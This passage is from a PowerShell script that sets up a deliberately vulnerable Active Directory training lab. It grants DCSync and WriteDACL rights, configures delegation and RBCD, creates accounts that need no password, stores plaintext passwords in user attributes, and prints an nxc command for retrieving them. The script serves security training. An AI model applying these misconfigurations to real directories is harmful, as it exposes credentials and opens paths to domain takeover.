    # Create service account with constrained delegation to CIFS
    $constrainedUser = "svc_constrained"
    
    try {
        $existing = Get-ADUser -Filter "SamAccountName -eq '$constrainedUser'" -ErrorAction SilentlyContinue
        if (-not $existing) {
            $securePassword = ConvertTo-SecureString "Constrained2024!" -AsPlainText -Force
            New-ADUser -Name $constrainedUser `
                -SamAccountName $constrainedUser `
                -UserPrincipalName "$constrainedUser@$DomainName" `
                -Path $serviceOU `
                -AccountPassword $securePassword `
                -Enabled $true `
                -PasswordNeverExpires $true `
                -Description "Service account with constrained delegation" `
                -ErrorAction Stop
        }
        
        # Set constrained delegation to CIFS on DC
        $dcName = $env:COMPUTERNAME
        $dcSPN = "CIFS/$dcName.$DomainName"
        
        # Get the user object
        $userObj = Get-ADUser -Filter "SamAccountName -eq '$constrainedUser'" -Properties "msDS-AllowedToDelegateTo"
        $currentSPNs = $userObj.'msDS-AllowedToDelegateTo'
        
        if ($currentSPNs -notcontains $dcSPN) {
            $newSPNs = @()
            if ($currentSPNs) {
                $newSPNs = $currentSPNs + $dcSPN
            } else {
                $newSPNs = @($dcSPN)
            }
            Set-ADUser -Identity $constrainedUser -Replace @{'msDS-AllowedToDelegateTo' = $newSPNs}
        }
        
        Set-ADAccountControl -Identity $constrainedUser -TrustedToAuthForDelegation $true
        Write-ColorOutput "  [+] Created $constrainedUser with constrained delegation to $dcSPN (Password: Constrained2024!)" "Green"
    } catch {
        Write-ColorOutput "  [!] Error configuring constrained delegation: $($_.Exception.Message)" "Red"
    }
    
    Write-ColorOutput "[+] Constrained delegation configured" "Green"
}

# Function to create dangerous ACLs
function Set-DangerousACLs {
    Write-ColorOutput "[*] Configuring dangerous ACLs..." "Yellow"
    
    $domainDN = (Get-ADDomain).DistinguishedName
    
    # Create a user that will have dangerous permissions
    # Made to look like a legitimate replication service account (realistic misconfiguration)
    $aclUser = "svc_replication"
    $serviceOU = "OU=ServiceAccounts,$domainDN"
    
    try {
        $existing = Get-ADUser -Filter "SamAccountName -eq '$aclUser'" -ErrorAction SilentlyContinue
        if (-not $existing) {
            $securePassword = ConvertTo-SecureString "thomas" -AsPlainText -Force
            New-ADUser -Name "Replication Service Account" `
                -GivenName "Replication" `
                -Surname "Service" `
                -SamAccountName $aclUser `
                -UserPrincipalName "$aclUser@$DomainName" `
                -Path $serviceOU `
                -AccountPassword $securePassword `
                -Enabled $true `
                -PasswordNeverExpires $true `
                -Description "Service account for Active Directory replication and synchronization tasks" `
                -ErrorAction Stop
        }
        
        # Grant DCSync rights (dangerous!)
        $aclUserSID = (Get-ADUser -Filter "SamAccountName -eq '$aclUser'").SID
        $domainDN = (Get-ADDomain).DistinguishedName
        
        # Use DSACLS or PowerShell to grant DCSync rights
        try {
            # Method 1: Use DSACLS command (more reliable)
            $aclUserDN = (Get-ADUser -Filter "SamAccountName -eq '$aclUser'").DistinguishedName
            $result1 = dsacls $domainDN /G "$($aclUserDN):CA;Replicating Directory Changes" 2>&1
            $result2 = dsacls $domainDN /G "$($aclUserDN):CA;Replicating Directory Changes All" 2>&1
            
            if ($LASTEXITCODE -eq 0) {
                Write-ColorOutput "  [+] Granted DCSync rights to $aclUser (Password: thomas)" "Green"
            } else {
                Write-ColorOutput "  [*] DSACLS method failed, trying alternative method..." "Yellow"
                throw "DSACLS failed"
            }
        } catch {
            # Method 2: Use ADSI (may require additional permissions)
            try {
                $domainObj = [ADSI]"LDAP://$domainDN"
                $userSID = New-Object System.Security.Principal.SecurityIdentifier($aclUserSID)
                $ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSID, "Replicating Directory Changes", "Allow")
                $ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSID, "Replicating Directory Changes All", "Allow")
                $domainObj.ObjectSecurity.AddAccessRule($ace1)
                $domainObj.ObjectSecurity.AddAccessRule($ace2)
                $domainObj.CommitChanges()
                Write-ColorOutput "  [+] Granted DCSync rights to $aclUser (Password: thomas)" "Green"
            } catch {
                Write-ColorOutput "  [!] Could not grant DCSync rights: $($_.Exception.Message)" "Red"
                Write-ColorOutput "  [*] You may need to grant these manually using: dsacls $domainDN /G `"$aclUserDN:CA;Replicating Directory Changes`"" "Yellow"
            }
        }
        
        # Grant WriteDACL on Domain Admins group
        try {
            $daGroup = Get-ADGroup -Identity "Domain Admins"
            $daDN = $daGroup.DistinguishedName
            $aclUserDN = (Get-ADUser -Filter "SamAccountName -eq '$aclUser'").DistinguishedName
            
            $result = dsacls $daDN /G "$($aclUserDN):WP;WriteDacl" 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-ColorOutput "  [+] Granted WriteDACL on Domain Admins to $aclUser" "Green"
            } else {
                Write-ColorOutput "  [*] Could not grant WriteDACL via DSACLS, trying alternative..." "Yellow"
                # Alternative method using ADSI
                $daObj = [ADSI]"LDAP://$daDN"
                $userSID = New-Object System.Security.Principal.SecurityIdentifier($aclUserSID)
                $ace3 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSID, "WriteDacl", "Allow")
                $daObj.ObjectSecurity.AddAccessRule($ace3)
                $daObj.CommitChanges()
                Write-ColorOutput "  [+] Granted WriteDACL on Domain Admins to $aclUser" "Green"
            }
        } catch {
            Write-ColorOutput "  [!] Could not grant WriteDACL: $($_.Exception.Message)" "Red"
            Write-ColorOutput "  [*] You may need to grant this manually" "Yellow"
        }
        
    } catch {
        Write-ColorOutput "  [!] Error configuring dangerous ACLs: $($_.Exception.Message)" "Red"
        Write-ColorOutput "  [*] This may require additional permissions or manual configuration" "Yellow"
    }
    
    Write-ColorOutput "[+] Dangerous ACLs configured" "Green"
}

# Function to create vulnerable GPOs
function New-VulnerableGPOs {
    Write-ColorOutput "[*] Creating vulnerable GPOs..." "Yellow"
    
    try {
        Import-Module GroupPolicy -ErrorAction Stop
        
        $domainDN = (Get-ADDomain).DistinguishedName
        
        # Create GPO with weak password policy
        $gpoName = "WeakPasswordPolicy"
        $gpo = Get-GPO -Name $gpoName -ErrorAction SilentlyContinue
        if (-not $gpo) {
            $gpo = New-GPO -Name $gpoName -Comment "Vulnerable GPO with weak password policy"
            
            # Set weak password policy
            Set-GPRegistryValue -Name $gpoName -Key "HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" `
                -ValueName "RequireStrongKey" -Type DWord -Value 0 -ErrorAction SilentlyContinue
            
            # Link to domain
            New-GPLink -Name $gpoName -Target $domainDN -ErrorAction SilentlyContinue
            
            Write-ColorOutput "  [+] Created vulnerable GPO: $gpoName" "Green"
        } else {
            Write-ColorOutput "  [+] GPO $gpoName already exists" "Green"
        }
        
        # Create GPO that allows password storage in plaintext
        $gpoName2 = "PlaintextPasswords"
        $gpo2 = Get-GPO -Name $gpoName2 -ErrorAction SilentlyContinue
        if (-not $gpo2) {
            $gpo2 = New-GPO -Name $gpoName2 -Comment "Vulnerable GPO allowing plaintext passwords"
            New-GPLink -Name $gpoName2 -Target $domainDN -ErrorAction SilentlyContinue
            Write-ColorOutput "  [+] Created vulnerable GPO: $gpoName2" "Green"
        } else {
            Write-ColorOutput "  [+] GPO $gpoName2 already exists" "Green"
        }
        
    } catch {
        Write-ColorOutput "  [!] Error creating vulnerable GPOs: $($_.Exception.Message)" "Red"
        Write-ColorOutput "  [*] Group Policy module may not be available" "Yellow"
    }
    
    Write-ColorOutput "[+] Vulnerable GPOs created" "Green"
}

# Function to create password not required accounts
function New-PasswordNotRequiredAccounts {
    Write-ColorOutput "[*] Creating accounts with password not required..." "Yellow"
    
    $domainDN = (Get-ADDomain).DistinguishedName
    $serviceOU = "OU=ServiceAccounts,$domainDN"
    
    $noPassUsers = @(
        @{Username="svc_nopass"; Description="Service account with no password requirement"},
        @{Username="guest_nopass"; Description="Guest account with no password requirement"}
    )
    
    foreach ($user in $noPassUsers) {
        try {
            $existing = Get-ADUser -Filter "SamAccountName -eq '$($user.Username)'" -ErrorAction SilentlyContinue
            if ($existing) {
                Set-ADAccountControl -Identity $user.Username -PasswordNotRequired $true
                Write-ColorOutput "  [+] Updated $($user.Username) with password not required" "Green"
            } else {
                $securePassword = ConvertTo-SecureString "TempPass123!" -AsPlainText -Force
                New-ADUser -Name $user.Username `
                    -SamAccountName $user.Username `
                    -UserPrincipalName "$($user.Username)@$DomainName" `
                    -Path $serviceOU `
                    -AccountPassword $securePassword `
                    -Enabled $true `
                    -PasswordNeverExpires $true `
                    -Description $user.Description `
                    -ErrorAction Stop
                
                Set-ADAccountControl -Identity $user.Username -PasswordNotRequired $true
                Write-ColorOutput "  [+] Created $($user.Username) with password not required" "Green"
            }
        } catch {
            Write-ColorOutput "  [!] Error creating $($user.Username): $($_.Exception.Message)" "Red"
        }
    }
    
    Write-ColorOutput "[+] Password not required accounts created" "Green"
}

# Function to create resource-based constrained delegation
function Set-ResourceBasedConstrainedDelegation {
    Write-ColorOutput "[*] Configuring resource-based constrained delegation..." "Yellow"
    
    $domainDN = (Get-ADDomain).DistinguishedName
    $serviceOU = "OU=ServiceAccounts,$domainDN"
    
    # Create a computer account that can be impersonated
    $targetComputer = "WEB01"
    $delegatorUser = "svc_rbcd"
    
    try {
        # Create delegator service account
        $existing = Get-ADUser -Filter "SamAccountName -eq '$delegatorUser'" -ErrorAction SilentlyContinue
        if (-not $existing) {
            $securePassword = ConvertTo-SecureString "RBCDService2024!" -AsPlainText -Force
            New-ADUser -Name $delegatorUser `
                -SamAccountName $delegatorUser `
                -UserPrincipalName "$delegatorUser@$DomainName" `
                -Path $serviceOU `
                -AccountPassword $securePassword `
                -Enabled $true `
                -PasswordNeverExpires $true `
                -Description "Service account for RBCD attack" `
                -ErrorAction Stop
        }
        
        # Try to configure RBCD on a computer account (may fail if computer doesn't exist, that's okay)
        try {
            $delegatorSID = (Get-ADUser -Filter "SamAccountName -eq '$delegatorUser'").SID
            
            # Try to find a computer account to configure RBCD on
            $targetComputerObj = Get-ADComputer -Identity $targetComputer -ErrorAction SilentlyContinue
            if (-not $targetComputerObj) {
                # Try to use the DC itself
                $targetComputer = $env:COMPUTERNAME
                $targetComputerObj = Get-ADComputer -Identity $targetComputer -ErrorAction SilentlyContinue
            }
            
            if ($targetComputerObj) {
                # Create SDDL string for RBCD
                $delegatorSIDString = $delegatorSID.Value
                $sddl = "O:SYG:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$delegatorSIDString)"
                
                # Convert SDDL to security descriptor
                $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
                $sd.SetSecurityDescriptorSddlForm($sddl)
                
                # Set the property using ADSI
                $computerDN = $targetComputerObj.DistinguishedName
                $computerADSI = [ADSI]"LDAP://$computerDN"
                $computerADSI.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value = $sd.GetSecurityDescriptorBinaryForm()
                $computerADSI.CommitChanges()
                
                Write-ColorOutput "  [+] Configured RBCD on $targetComputer for $delegatorUser (Password: RBCDService2024!)" "Green"
            } else {
                Write-ColorOutput "  [*] No suitable computer account found for RBCD configuration" "Yellow"
                Write-ColorOutput "  [*] RBCD can be configured manually on target computers" "Yellow"
                Write-ColorOutput "  [*] Note: WEB01 computer account does not exist - using DC as fallback failed" "Yellow"
            }
        } catch {
            Write-ColorOutput "  [!] Error configuring RBCD: $($_.Exception.Message)" "Red"
            Write-ColorOutput "  [*] RBCD may need to be configured manually" "Yellow"
            Write-ColorOutput "  [*] Note: This is expected if target computer account doesn't exist" "Cyan"
        }
        
    } catch {
        Write-ColorOutput "  [!] Error in RBCD setup: $($_.Exception.Message)" "Red"
    }
    
    Write-ColorOutput "[+] Resource-based constrained delegation configured" "Green"
}

# Function to add realistic descriptions with tokens, purpose, and passwords (information disclosure vulnerability)
function Set-PasswordsInDescriptions {
    Write-ColorOutput "[*] Adding realistic descriptions with tokens, purpose, and passwords..." "Yellow"
    Write-ColorOutput "  [*] Creating realistic corporate AD descriptions with employee IDs, MFA tokens, and temp passwords" "Cyan"
    
    # Map of usernames to their actual passwords (for attack paths)
    $userPasswords = @{
        "jsmith" = "Password1"
        "sjohnson" = "Welcome1"
        "mwilliams" = "123456789"
        "ebrown" = "12345"
        "djones" = "Qwerty1"
        "jgarcia" = "Abc123!"
        "rmiller" = "monkey"
        "adavis" = "1234567"
        "crodriguez" = "Letmein1"
        "mmartinez" = "trustno1"
        "dhernandez" = "dragon"
        "llopez" = "baseball"
        "jwilson" = "iloveyou"
        "panderson" = "master"
        "mthomas" = "sunshine"
        "john" = "ashley"
        "jane" = "bailey"
        "bwilliams" = "princess"
        "asmith" = "michael"
        "user" = "123123"
        "johnsmith" = "654321"
        "sarahjohnson" = "superman"
        "michaelbrown" = "qazwsx"
        "svc_backup" = "welcome"
        "svc_sql" = "football"
        "admin_legacy" = "jesus"
        "svc_http" = "ninja"
        "svc_mssql" = "mustang"
        "svc_exchange" = "password1"
        "svc_iis" = "charlie"
        "svc_delegation" = "Delegation2024!"
        "svc_constrained" = "Constrained2024!"
        "svc_rbcd" = "RBCDService2024!"
        "svc_replication" = "thomas"
        "backup_admin" = "robert"
        # New realistic users
        "kwhite" = "jordan"
        "nharris" = "tigger"
        "rclark" = "shadow"
        "slewis" = "hunter"
        "lwalker" = "buster"
        "mhall" = "soccer"
        "jallen" = "harley"
        "eyoung" = "batman"
        "nking" = "thomas"
        "swright" = "hockey"
        "tlopez" = "ranger"
        "khill" = "daniel"
        "nscott" = "maggie"
        "bgreen" = "summer"
        "hadams" = "winter"
        "sbaker" = "marley"
        "dnelson" = "august"
        "ccarter" = "samson"
        "rmitchell" = "april"
        "sperez" = "william"
        "mroberts" = "tucker"
        "eturner" = "michelle"
        "kphillips" = "charlie"
    }
    
    # Map of usernames to their titles/departments (for realistic descriptions)
    $userInfo = @{
        "jsmith" = @{Title="System Administrator"; Department="IT"; Token="123456"}
        "sjohnson" = @{Title="Accountant"; Department="Finance"; Token="234567"}
        "mwilliams" = @{Title="HR Manager"; Department="HR"; Token="345678"}
        "ebrown" = @{Title="Sales Manager"; Department="Sales"; Token="456789"}
        "djones" = @{Title="Help Desk"; Department="IT"; Token="567890"}
        "jgarcia" = @{Title="Developer"; Department="IT"; Token="678901"}
        "rmiller" = @{Title="Financial Analyst"; Department="Finance"; Token="789012"}
        "adavis" = @{Title="Operations Manager"; Department="Operations"; Token="890123"}
        "crodriguez" = @{Title="Network Admin"; Department="IT"; Token="901234"}
        "mmartinez" = @{Title="Sales Rep"; Department="Sales"; Token="012345"}
        "dhernandez" = @{Title="Database Admin"; Department="IT"; Token="112233"}
        "llopez" = @{Title="HR Specialist"; Department="HR"; Token="223344"}
        "jwilson" = @{Title="Security Analyst"; Department="IT"; Token="334455"}
        "panderson" = @{Title="Payroll Specialist"; Department="Finance"; Token="445566"}
        "mthomas" = @{Title="IT Manager"; Department="IT"; Token="556677"}
        "john" = @{Title="IT Support"; Department="IT"; Token="667788"}
        "jane" = @{Title="HR Assistant"; Department="HR"; Token="778899"}
        "bwilliams" = @{Title="IT Specialist"; Department="IT"; Token="889900"}
        "asmith" = @{Title="Financial Analyst"; Department="Finance"; Token="990011"}
        "user" = @{Title="Standard User"; Department="IT"; Token="001122"}
        "johnsmith" = @{Title="Senior Admin"; Department="IT"; Token="110022"}
        "sarahjohnson" = @{Title="Senior Accountant"; Department="Finance"; Token="220033"}
        "michaelbrown" = @{Title="Sales Director"; Department="Sales"; Token="330044"}
        # Service account tokens
        "svc_backup" = @{Title="Service Account"; Department="IT"; Token="440055"}
        "svc_sql" = @{Title="Service Account"; Department="IT"; Token="550066"}
        "svc_http" = @{Title="Service Account"; Department="IT"; Token="660077"}
        "svc_mssql" = @{Title="Service Account"; Department="IT"; Token="770088"}
        "svc_exchange" = @{Title="Service Account"; Department="IT"; Token="880099"}
        "svc_iis" = @{Title="Service Account"; Department="IT"; Token="990000"}
        "svc_delegation" = @{Title="Service Account"; Department="IT"; Token="101112"}
        "svc_constrained" = @{Title="Service Account"; Department="IT"; Token="202223"}
        "svc_rbcd" = @{Title="Service Account"; Department="IT"; Token="303334"}
        "svc_replication" = @{Title="Service Account"; Department="IT"; Token="404445"}
        "admin_legacy" = @{Title="Legacy Admin"; Department="IT"; Token="505556"}
        "backup_admin" = @{Title="Backup Administrator"; Department="IT"; Token="606667"}
        # New realistic users
        "kwhite" = @{Title="Help Desk Technician"; Department="IT"; Token="707778"}
        "nharris" = @{Title="Help Desk Support"; Department="IT"; Token="808889"}
        "rclark" = @{Title="IT Support Specialist"; Department="IT"; Token="909990"}
        "slewis" = @{Title="System Administrator"; Department="IT"; Token="101111"}
        "lwalker" = @{Title="Senior System Admin"; Department="IT"; Token="202222"}
        "mhall" = @{Title="Infrastructure Admin"; Department="IT"; Token="303333"}
        "jallen" = @{Title="Software Developer"; Department="IT"; Token="404444"}
        "eyoung" = @{Title="Senior Developer"; Department="IT"; Token="505555"}
        "nking" = @{Title="Full Stack Developer"; Department="IT"; Token="606666"}
        "swright" = @{Title="Senior Accountant"; Department="Finance"; Token="707777"}
        "tlopez" = @{Title="Accounting Manager"; Department="Finance"; Token="808888"}
        "khill" = @{Title="Staff Accountant"; Department="Finance"; Token="909999"}
        "nscott" = @{Title="Payroll Manager"; Department="Finance"; Token="110000"}
        "bgreen" = @{Title="Payroll Specialist"; Department="Finance"; Token="220000"}
        "hadams" = @{Title="HR Manager"; Department="HR"; Token="330000"}
        "sbaker" = @{Title="HR Coordinator"; Department="HR"; Token="440000"}
        "dnelson" = @{Title="Recruiter"; Department="HR"; Token="550000"}
        "ccarter" = @{Title="Regional Sales Manager"; Department="Sales"; Token="660000"}
        "rmitchell" = @{Title="Sales Representative"; Department="Sales"; Token="770000"}
        "sperez" = @{Title="Account Executive"; Department="Sales"; Token="880000"}
        "mroberts" = @{Title="Operations Coordinator"; Department="Operations"; Token="990000"}
        "eturner" = @{Title="Operations Analyst"; Department="Operations"; Token="111000"}
        "kphillips" = @{Title="Operations Manager"; Department="Operations"; Token="222000"}
    }
    
    # Users that should have working passwords in descriptions (for attack paths)
    $usersWithWorkingPasswords = @("jsmith", "sjohnson", "djones", "jgarcia", "crodriguez", "bwilliams", "asmith", "svc_backup", "svc_sql", "svc_http", "svc_mssql", "svc_exchange", "svc_iis", "admin_legacy", "backup_admin")
    
    $usersModified = 0
    
    # Get ALL users from AD (excluding built-in system accounts)
    Write-ColorOutput "  [*] Querying all users from Active Directory..." "Cyan"
    $excludedAccounts = @("Administrator", "Guest", "krbtgt", "DefaultAccount", "WDAGUtilityAccount")
    $allADUsers = Get-ADUser -Filter * -Properties Title, Department, Description -ErrorAction SilentlyContinue | 
        Where-Object { $excludedAccounts -notcontains $_.SamAccountName }
    
    Write-ColorOutput "  [*] Found $($allADUsers.Count) users to process" "Cyan"
    
    foreach ($user in $allADUsers) {
        $username = $user.SamAccountName
        try {
            # Check if we have password info for this user
            $hasPasswordInfo = $userPasswords.ContainsKey($username)
            $password = if ($hasPasswordInfo) { $userPasswords[$username] } else { $null }
            $hasWorkingPassword = $usersWithWorkingPasswords -contains $username
            
            # Get 6-digit token (employee ID or service token)
            $token = if ($userInfo.ContainsKey($username)) {
                $userInfo[$username].Token
            } else {
                # Generate consistent token based on username hash (so it's the same each run)
                $hash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($username))
                $tokenValue = [Math]::Abs([BitConverter]::ToInt32($hash, 0)) % 900000 + 100000
                $tokenValue.ToString()
            }
            
            # Build realistic description based on user type
            if ($username -like "svc_*") {
                # Service accounts - realistic service account descriptions
                $servicePurpose = switch ($username) {
                    "svc_backup" { "Backup and recovery operations" }
                    "svc_sql" { "SQL Server database services" }
                    "svc_http" { "Web server application pool" }
                    "svc_mssql" { "MSSQL database service account" }
                    "svc_exchange" { "Exchange mail server services" }
                    "svc_iis" { "IIS web server application pool" }
                    "svc_delegation" { "Application delegation services" }
                    "svc_constrained" { "Constrained delegation service account" }
                    "svc_rbcd" { "Resource-based constrained delegation account" }
                    "svc_replication" { "Active Directory replication and synchronization" }
                    default { "Service account" }
                }
                
                if ($hasWorkingPassword -and $password) {
                    $newDesc = "$servicePurpose | Service Token: $token | Password: $password"
                } else {
                    $newDesc = "$servicePurpose | Service Token: $token"
                }
            } elseif ($username -eq "admin_legacy") {
                # Legacy admin account
                if ($hasWorkingPassword -and $password) {
                    $newDesc = "Legacy Admin Account - Employee ID: $token | Default Password: $password"
                } else {
                    $newDesc = "Legacy Admin Account - Employee ID: $token"
                }
            } elseif ($username -eq "backup_admin") {
                # Backup admin account
                if ($password) {
                    $newDesc = "IT Department - Backup Administrator | Employee ID: $token | Service Password: $password"
                } else {
                    $newDesc = "IT Department - Backup Administrator | Employee ID: $token"
                }
            } else {
                # Regular users - realistic employee descriptions
                $title = if ($userInfo.ContainsKey($username)) { $userInfo[$username].Title } else { 
                    if ($user.Title) { $user.Title } else { "Employee" }
                }
                $dept = if ($userInfo.ContainsKey($username)) { $userInfo[$username].Department } else { 
                    if ($user.Department) { $user.Department } else { "General" }
                }
                
                if ($hasWorkingPassword -and $password) {
                    # Some users have temp passwords in description (realistic scenario)
                    $newDesc = "$dept Department - $title | Employee ID: $token | Temp Password: $password (expires in 30 days)"
                } else {
                    # Most users just have role and token
                    $newDesc = "$dept Department - $title | Employee ID: $token"
                }
            }
            
            # Always overwrite description with new format (even if account already exists)
            Set-ADUser -Identity $username -Description $newDesc -ErrorAction Stop
            Write-ColorOutput "  [+] Updated description for $username" "Green"
            $usersModified++
        } catch {
            Write-ColorOutput "  [!] Could not modify $username : $($_.Exception.Message)" "Red"
        }
    }
    
    Write-ColorOutput "[+] Updated descriptions for $usersModified user(s) with realistic corporate information" "Green"
    Write-ColorOutput "  [*] All descriptions have been overwritten with new format (tokens, purpose, passwords)" "Cyan"
}

# Function to create accounts with sensitive data in attributes
function Set-SensitiveDataInAttributes {
    Write-ColorOutput "[*] Adding sensitive data to user attributes..." "Yellow"
    
    try {
        # Add password hints, notes, etc. to existing users
        $usersToModify = @("jsmith", "admin_legacy", "svc_backup")
        
        foreach ($username in $usersToModify) {
            try {
                $user = Get-ADUser -Filter "SamAccountName -eq '$username'" -ErrorAction SilentlyContinue
                if ($user) {
                    # Only add info to notes/comment field (not description - that will be overwritten by Set-PasswordsInDescriptions)
                    # Add info to notes/comment field
                    Set-ADUser -Identity $username -Replace @{info = "Backup password: welcome" } -ErrorAction SilentlyContinue
                    
                    Write-ColorOutput "  [+] Added sensitive data to $username attributes (info field)" "Green"
                }
            } catch {
                # Ignore errors for individual users
            }
        }
    } catch {
        Write-ColorOutput "  [!] Error adding sensitive data: $($_.Exception.Message)" "Red"
    }
    
    Write-ColorOutput "[+] Sensitive data added to attributes" "Green"
}

# Function to set userPassword attribute (LDAP password disclosure vulnerability)
function Set-UserPasswordAttribute {
    Write-ColorOutput "[*] Setting userPassword attribute for password disclosure attack..." "Yellow"
    Write-ColorOutput "  [*] This creates a vulnerability where passwords can be retrieved via LDAP queries" "Cyan"
    
    # Users and their passwords to set in userPassword attribute
    # This simulates a misconfiguration where passwords are stored in the userPassword LDAP attribute
    $usersWithPasswordAttribute = @{
        "djones" = "Qwerty1"
        "sjohnson" = "Welcome1"
        "jgarcia" = "Abc123!"
        "crodriguez" = "Letmein1"
        "kwhite" = "jordan"
        "nharris" = "tigger"
        "slewis" = "hunter"
        "swright" = "hockey"
        "tlopez" = "ranger"
        "hadams" = "winter"
        "sbaker" = "marley"
        "ccarter" = "samson"
        "svc_backup" = "welcome"
        "svc_sql" = "football"
        "admin_legacy" = "jesus"
    }
    
    $usersModified = 0
    
    foreach ($username in $usersWithPasswordAttribute.Keys) {
        try {
            $user = Get-ADUser -Filter "SamAccountName -eq '$username'" -ErrorAction SilentlyContinue
            if ($user) {
                $password = $usersWithPasswordAttribute[$username]
                
                # Get user's DN for ADSI access
                $userDN = $user.DistinguishedName
                
                # Use ADSI to set userPassword attribute (requires direct LDAP modification)
                try {
                    $userADSI = [ADSI]"LDAP://$userDN"
                    
                    # Convert password to UTF-8 bytes (LDAP userPassword is typically UTF-8 encoded)
                    $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)
                    
                    # Set userPassword attribute (this is a cleartext password storage vulnerability)
                    $userADSI.Properties["userPassword"].Clear()
                    $userADSI.Properties["userPassword"].Add($passwordBytes)
                    $userADSI.CommitChanges()
                    
                    Write-ColorOutput "  [+] Set userPassword attribute for $username (Password: $password)" "Green"
                    $usersModified++
                } catch {
                    # Alternative method using Set-ADUser -Replace
                    try {
                        # Try setting as string (some AD implementations accept this)
                        Set-ADUser -Identity $username -Replace @{userPassword = $password } -ErrorAction Stop
                        Write-ColorOutput "  [+] Set userPassword attribute for $username (Password: $password)" "Green"
                        $usersModified++
                    } catch {
                        Write-ColorOutput "  [!] Could not set userPassword for $username : $($_.Exception.Message)" "Red"
                        Write-ColorOutput "  [*] This may require schema modifications or specific permissions" "Yellow"
                    }
                }
            } else {
                Write-ColorOutput "  [!] User $username not found - skipping userPassword attribute" "Yellow"
            }
        } catch {
            Write-ColorOutput "  [!] Error processing $username : $($_.Exception.Message)" "Red"
        }
    }
    
    if ($usersModified -gt 0) {
        Write-ColorOutput "[+] Set userPassword attribute for $usersModified user(s)" "Green"
        Write-ColorOutput "  [*] Attack path: Use 'nxc ldap <DC_IP> -d <domain> -u <user> -p <pass> -M get-userPassword' to retrieve passwords" "Cyan"
        Write-ColorOutput "  [*] Example: nxc ldap 192.168.72.129 -d breakme.local -u djones -p Qwerty1 -M get-userPassword" "Cyan"
    } else {
        Write-ColorOutput "  [!] No users were modified - userPassword attribute may not be supported or requires schema changes" "Yellow"
        Write-ColorOutput "  [*] Note: userPassword attribute requires the LDAP schema to support it" "Yellow"
        Write-ColorOutput "  [*] This vulnerability may need to be simulated differently in some AD environments" "Yellow"
    }
}

# Main execution
Write-ColorOutput "========================================" "Cyan"
Write-ColorOutput "  Vulnerable AD Lab Setup Script" "Cyan"
Write-ColorOutput "========================================" "Cyan"
Write-ColorOutput ""

# Check administrator privileges
if (-not (Test-Administrator)) {
    Write-ColorOutput "[!] This script must be run as Administrator!" "Red"
    exit 1
}

# Function to check if user has domain admin privileges (for Stage2)
function Test-DomainAdmin {
    try {
        Import-Module ActiveDirectory -ErrorAction SilentlyContinue
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
        
        # Check if user is in Domain Admins group
        $domainAdmins = Get-ADGroup -Identity "Domain Admins" -ErrorAction SilentlyContinue
        if ($domainAdmins) {
            $userGroups = (Get-ADUser -Identity $currentUser.Name -Properties MemberOf -ErrorAction SilentlyContinue).MemberOf
            if ($userGroups -contains $domainAdmins.DistinguishedName) {
                return $true
            }
        }
        
        # Also check if user is the built-in Administrator (which is Domain Admin after DC promotion)
        if ($currentUser.Name -like "*\Administrator" -or $currentUser.Name -like "Administrator@*") {
            return $true
        }
        
        return $false
    } catch {
        # If we can't check, assume local admin is sufficient (for Stage1)
        return $false
    }
}

try {
    # Display stage information
    Write-ColorOutput "[*] Stage Mode: $Stage" "Cyan"
    Write-ColorOutput "" "White"
    
    # Check if AD DS role is installed
    $adDSInstalled = $false
    $adDSFeature = Get-WindowsFeature -Name AD-Domain-Services -ErrorAction SilentlyContinue
    if ($adDSFeature -and $adDSFeature.InstallState -eq "Installed") {
        $adDSInstalled = $true
        Write-ColorOutput "[*] AD DS role is installed" "Yellow"
    } else {
        Write-ColorOutput "[*] AD DS role is not installed" "Yellow"
    }
    
    # Check current domain/workgroup status
    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
    $currentDomain = $computerSystem.Domain
    $isInWorkgroup = ($currentDomain -eq "WORKGROUP" -or $currentDomain -eq "")
    
    # Check if already a DC (using multiple verification methods)
    # Skip ADWS check when determining stage - ADWS will be checked in Stage 2
    Write-ColorOutput "[*] Checking if server is already a Domain Controller..." "Yellow"
    Write-ColorOutput "  [*] Current domain/workgroup: $currentDomain" "Yellow"
    $isDC = Test-IsDomainController -SkipADWSCheck
    
    # If we're in WORKGROUP, we're definitely not a DC, regardless of other indicators
    if ($isInWorkgroup) {
        Write-ColorOutput "  [*] Computer is in WORKGROUP - DC promotion required" "Yellow"
        if ($isDC) {
            Write-ColorOutput "  [!] WARNING: DC indicators found but computer is in WORKGROUP!" "Red"
            Write-ColorOutput "  [!] This indicates an incomplete or failed DC promotion" "Red"
            Write-ColorOutput "  [!] The script will attempt to complete the DC promotion" "Yellow"
        }
        $isDC = $false  # Force Stage1 if in WORKGROUP
    }
    
    # Determine which stage to run based on Stage parameter
    $runStage1 = $false
    $runStage2 = $false
    $runStage3 = $false
    
    if ($Stage -eq "Stage1") {
        Write-ColorOutput "[*] Stage1 mode: Will install AD DS and promote to DC" "Yellow"
        $runStage1 = $true
        if ($isDC -and -not $isInWorkgroup) {
            Write-ColorOutput "[!] WARNING: Server is already a DC, but Stage1 was specified." "Yellow"
            Write-ColorOutput "[!] Stage1 will be skipped. Use Stage2, Stage3, or Auto mode instead." "Yellow"
            $runStage1 = $false
        } elseif ($isInWorkgroup) {
            Write-ColorOutput "[*] Computer is in WORKGROUP - Stage1 will proceed with DC promotion" "Yellow"
        }
    } elseif ($Stage -eq "Stage2") {
        Write-ColorOutput "[*] Stage2 mode: Will configure AD (OUs, users, groups, shares)" "Yellow"
        $runStage2 = $true
        if (-not $isDC) {
            Write-ColorOutput "[!] WARNING: Server is not a DC, but Stage2 was specified." "Yellow"
            Write-ColorOutput "[!] Please run Stage1 first to promote the server to DC." "Yellow"
            exit 1
        }
    } elseif ($Stage -eq "Stage3") {
        Write-ColorOutput "[*] Stage3 mode: Will deploy advanced vulnerable attack paths" "Yellow"
        $runStage3 = $true
        if (-not $isDC) {
